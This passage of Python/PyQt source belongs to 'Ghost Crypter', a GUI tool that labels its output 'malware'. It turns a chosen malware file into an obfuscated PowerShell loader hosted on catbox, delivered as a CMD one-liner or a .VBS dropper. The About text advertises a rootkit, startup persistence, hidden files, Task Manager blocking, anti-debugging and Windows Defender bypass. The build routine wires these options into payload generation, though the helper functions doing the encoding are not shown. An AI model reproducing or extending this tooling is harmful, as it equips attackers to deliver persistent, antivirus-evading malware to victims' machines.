        about_layout.setContentsMargins(30, 30, 30, 30)
        about_layout.setSpacing(25)
        
        about_title = QLabel("About Ghost Crypter")
        about_title.setFont(QFont("Segoe UI Variable", 20, QFont.Bold))
        about_title.setStyleSheet("""
            color: #fff;
            padding: 12px;
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #2a2a2a, stop:1 #4a4a4a);
            border-radius: 12px;
        """)
        about_title.setAlignment(Qt.AlignCenter)
        about_layout.addWidget(about_title)
        
        credits_text = (
            "Ghost Crypter v1.0\n\n"
            "Fucked by 0xJoex\n"
            "Discord: 0xjoex\n"
            "Telegram: joexfr\n\n"
            "Features:\n" 
            "- R00TKIT\n"
            "- Payload Super Obfuscation\n" 
            "- Startup Folder Persistence\n"
            "- Super Hidden (attrib +H +S)\n" 
            "- Block Taskmgr - System and Network Process Viewer\n" 
            "- Delete After Run In .VBS\n" 
            "- Anti Debug\n"
            "- Short CMD Command\n" 
            "- Create VBS code or generate CMD code (both bypass Windows Defender)\n"
        )
        
        self.text_edit = QTextEdit()
        self.text_edit.setText(credits_text)
        self.text_edit.setReadOnly(True)
        self.text_edit.setFont(QFont("Segoe UI", 18))
        self.text_edit.setStyleSheet("""
            QTextEdit {
                background-color: #1a1a1a;
                border: 2px solid #444;
                border-radius: 12px;
                color: #ddd;
                padding: 15px;
                font-family: 'Segoe UI';
                font-size: 14px;
                line-height: 1.6;
                font-weight: 500;
            }
        """)
        
        about_layout.addWidget(self.text_edit)
        
        version_label = QLabel("Ghost Crypter WAS Here")
        version_label.setFont(QFont("Segoe UI", 12))
        version_label.setStyleSheet("color: #777;")
        version_label.setAlignment(Qt.AlignCenter)
        
        about_layout.addWidget(version_label)
        about_layout.addStretch()
        
        self.content_layout.addWidget(page_about)
    
    def on_format_changed(self, text):
        if text == "CMD Command":
            self.btn_build.setText("GENERATE CODE ")
            self.btn_build.setIcon(load_icon("generate.png", 28))
        elif text == ".VBS":
            self.btn_build.setText("BUILD MALWARE ")
            self.btn_build.setIcon(load_icon("build.png", 28))
    
    def select_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Malware File")
        if path:
            self.file_path = path
            self.label_uploaded_file.setText(f"Uploaded: {os.path.basename(path)}")
            self.btn_build.setEnabled(True)
            self.progress_circle.animate_to(50)
    
    def build_script(self):
        if not self.file_path:
            msg = QMessageBox(self)
            msg.setIcon(QMessageBox.Warning)
            msg.setWindowTitle("Warning")
            msg.setText("Please select a malware file first!")
            msg.exec()
            return
        
        format_type = self.format_combo.currentText()
        
        if format_type == "CMD Command" and self.chk_del_after_run.isChecked():
            msg = QMessageBox(self)
            msg.setIcon(QMessageBox.Information)
            msg.setWindowTitle("Information")
            msg.setText("Delete After Run feature only works with .VBS format.")
            msg.exec()
            return
        
        if format_type == ".VBS" and self.chk_short_code.isChecked():
            msg = QMessageBox(self)
            msg.setIcon(QMessageBox.Information)
            msg.setWindowTitle("Information")
            msg.setText("Short Code feature only works with CMD Command format.")
            msg.exec()
            return
        
        self.btn_build.setEnabled(False)
        self.progress_circle.animate_to(75)
        
        try:
            b64_data = self.logic.encode_file_to_base64(self.file_path)
            payload_url = self.logic.upload_to_catbox(b64_data, is_payload=True)
            
            if not payload_url:
                raise Exception("Payload upload failed!")
            
            self.progress_circle.animate_to(90)
            
            ps_script = self.logic.create_powershell_script(
                payload_url,
                super_hidden=self.chk_super_hidden.isChecked(),
                add_startup=self.chk_startup.isChecked(),
                rootkit_enabled=self.chk_rootkit.isChecked(),
                block_taskmgr=self.chk_block_taskmgr.isChecked(),
                del_after_run=self.chk_del_after_run.isChecked(),
                wd_exclusion=self.chk_wd_exclusion.isChecked(),
                short_code=self.chk_short_code.isChecked(),
                hide_console=True,
                anti_debug=self.chk_anti_debug.isChecked()
            )
            
            quadruple_char_encoded_ps = self.logic.quadruple_char_encode_ps_script(ps_script)
            
            if self.chk_short_code.isChecked():
                final_ps_wrapper = self.logic.create_short_quadruple_char_encoded_ps_wrapper(quadruple_char_encoded_ps)
            else:
                final_ps_wrapper = self.logic.create_quadruple_char_encoded_ps_wrapper(quadruple_char_encoded_ps)
            
            ps_script_url = self.logic.upload_to_catbox(final_ps_wrapper, is_payload=False)
            
            if not ps_script_url:
                raise Exception("PowerShell script upload failed!")
            
            self.progress_circle.animate_to(100)
            
            if format_type == "CMD Command":
                output_code = self.logic.create_cmd_code(ps_script_url, self.chk_short_code.isChecked())
                clipboard = QApplication.clipboard()
                clipboard.setText(output_code)
                
                msg = QMessageBox(self)
                msg.setIcon(QMessageBox.Information)
                msg.setWindowTitle("Success")
                msg.setText("CMD Code generated and copied to clipboard!")
                msg.exec()
                
            elif format_type == ".VBS":
                vbs_code = self.logic.create_vbs_code(ps_script_url, self.chk_del_after_run.isChecked(), self.chk_short_code.isChecked())
                
                save_path, _ = QFileDialog.getSaveFileName(
                    self,
                    "Save VBS Malware File",
                    "ghost_crypter.vbs",
                    "VBS Files (*.vbs)"
                )
                
                if save_path:
                    with open(save_path, "w", encoding="utf-8") as f:
                        f.write(vbs_code)
                    
                    msg = QMessageBox(self)
                    msg.setIcon(QMessageBox.Information)
                    msg.setWindowTitle("Success")
                    msg.setText(f"VBS Malware file saved successfully!\n\nSaved to: {save_path}")
                    msg.exec()
        
        except Exception as e:
            msg = QMessageBox(self)
            msg.setIcon(QMessageBox.Critical)
            msg.setWindowTitle("Error")
            msg.setText(f"Failed to build crypter: {str(e)}")
            msg.exec()
        
        finally:
            self.btn_build.setEnabled(True)
            QTimer.singleShot(1000, lambda: self.progress_circle.animate_to(0))
    
    def style_main_buttons(self, button):
        button.setStyleSheet("""
            QPushButton {
                background-color: #202020;
                color: #fff;
                border: 2px solid #444;
                border-radius: 16px;
                font-weight: bold;
                font-size: 20px;
                padding: 25px 40px;
                transition: all 0.3s;
            }
            QPushButton:hover {
                background-color: #2d2d2d;
                border-color: #888;
                transform: scale(1.02);
            }
            QPushButton:pressed {
                background-color: #121212;
                border-color: #333;
                transform: scale(0.98);
            }
            QPushButton:disabled {
                background-color: #111;
                border-color: #222;
                color: #555;
            }
        """)
        button.setCursor(QCursor(Qt.PointingHandCursor))
    
    def style_checkboxes(self, checkbox):
        checkbox.setStyleSheet("""
            QCheckBox {
                color: #ddd;
                font-size: 18px;
                spacing: 20px;
                padding: 5px;
                border-radius: 6px;
            }
            QCheckBox:hover {
                background-color: #1a1a1a;
            }
            QCheckBox::indicator {
                width: 24px;
                height: 24px;
                border-radius: 8px;
                border: 2px solid #555;
                background: #222;
            }
            QCheckBox::indicator:hover {
                border-color: #aaa;
            }
            QCheckBox::indicator:checked {
                background-color: #666;
                border-color: #ccc;
                image: url(icons/check.png);
            }
        """)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    window = CrypterGUI()
    window.show()
    sys.exit(app.exec())
